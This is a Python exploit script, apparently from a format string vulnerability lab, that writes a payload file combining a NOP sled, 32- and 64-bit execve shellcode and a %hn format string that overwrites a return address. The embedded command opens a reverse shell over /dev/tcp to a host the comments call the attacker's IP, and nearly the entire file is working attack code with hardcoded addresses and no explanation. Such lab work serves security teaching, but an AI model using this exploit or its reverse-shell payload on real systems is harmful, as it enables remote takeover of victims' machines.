#!/usr/bin/python3
import sys

# 32-bit Generic Shellcode 
shellcode_32 = (
   "\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b"
   "\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54"
   "\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff"
   "/bin/bash*"
   "-c*"
   # The * in this line serves as the position marker         *
   "/bin/bash -i > /dev/tcp/10.0.2.15/9090 0<&1 2>&1          *"
   "/bin/ls -l; echo '===== Success! ======'                  *"
   "AAAA"   # Placeholder for argv[0] --> "/bin/bash"
   "BBBB"   # Placeholder for argv[1] --> "-c"
   "CCCC"   # Placeholder for argv[2] --> the command string
   "DDDD"   # Placeholder for argv[3] --> NULL
).encode('latin-1')

#open bin bash command put all io signals to this IP  and this port
#attackers IP 10.0.2.15
# 64-bit Generic Shellcode 
shellcode_64 = (
   "\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48"
   "\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48"
   "\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31"
   "\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff"
   "/bin/bash*"
   "-c*"
   # The * in this line serves as the position marker         *
   "/bin/bash -i > /dev/tcp/10.0.2.15/9090 0<&1 2>&1          *"
   "/bin/ls -l; echo '===== Success! ======'                  *"
   "AAAAAAAA"   # Placeholder for argv[0] --> "/bin/bash"
   "BBBBBBBB"   # Placeholder for argv[1] --> "-c"
   "CCCCCCCC"   # Placeholder for argv[2] --> the command string
   "DDDDDDDD"   # Placeholder for argv[3] --> NULL
).encode('latin-1')
#buffer 0xffffd160
#NOP return 0xFFFFD674
#NEW NOP FFFFDCF4
# frame point 0xffffd088
#target 0x080e5068
N = 1500
# Fill the content with NOP's
content = bytearray(0x90 for i in range(N))

# Choose the shellcode version based on your target
shellcode = shellcode_64

# Put the shellcode somewhere in the payload
start = 810# we use the middle of the stack because we are using the 
#end of the stack for the adresses
content[start:start + len(shellcode)] = shellcode
############################################################
#7FFFFFFFEA1C 7FFFFFFFE4AC this should be a value in the nopsled
ret= 0x00007fffffffe0e0 + 8
#ret = 0x555555558010
#buffer+780 as nop slep changing to 800 and putting shellcode closer 
#810 + len(shellcode)
number1= ret + 6
number2= ret + 4 
number3= ret + 2
number4= ret 
content[1440:1448]  =  (number1).to_bytes(8,byteorder='little')
content[1448:1456]  =  ("@@@@@@@@").encode('latin-1')
content[1456:1464]  =  (number2).to_bytes(8,byteorder='little')
content[1464:1472]  =  ("@@@@@@@@").encode('latin-1')
content[1472:1480]  =  (number3).to_bytes(8,byteorder='little')
content[1480:1488]  =  ("@@@@@@@@").encode('latin-1')
content[1488:1496]  =  (number4).to_bytes(8,byteorder='little')
offset1= 0xFFFD - 0x0607 + 8 
offset2 = 0x7FFF # this should land in the NOP 
offset3= 0xFFFF- 0x7FFF
offset4 = 0xE4C0 + 1

s = "%x" * 212 + "%." + str(offset1) + "x" + "%hn"  + "%." + str(offset2) + "x" + "%hn"+ "%." + str(offset3) + "x" + "%hn"+ "%." + str(offset4) + "x" + "%hn"

"""ret= 0x0000555555558010 
number1= ret + 4
number2= ret + 2
number3= ret 

content[1456:1464]  =  (number1).to_bytes(8,byteorder='little')
content[1464:1472]  =  ("@@@@@@@@").encode('latin-1')
content[1472:1480]  =  (number2).to_bytes(8,byteorder='little')
content[1480:1488]  =  ("@@@@@@@@").encode('latin-1')
content[1488:1496]  =  (number3).to_bytes(8,byteorder='little')
offset1= 0xFFFF- 0x1fc + 267
offset2 = 0xDCF4 + 1
offset3 = 0x0000
s = "%x" * 214 + "%." + str(offset1) + "x" + "%hn"  + "%." + str(offset2) + "x" + "%hn"+ "%." + str(offset3) + "x" + "%hn" """
# this writes the first count to the first address and the next

# The line shows how to store the string s at offset 8
fmt  = (s).encode('latin-1')

content[0:0+len(fmt)] = fmt

############################################################

# Save the format string to file
with open('badfile', 'wb') as f:
  f.write(content)
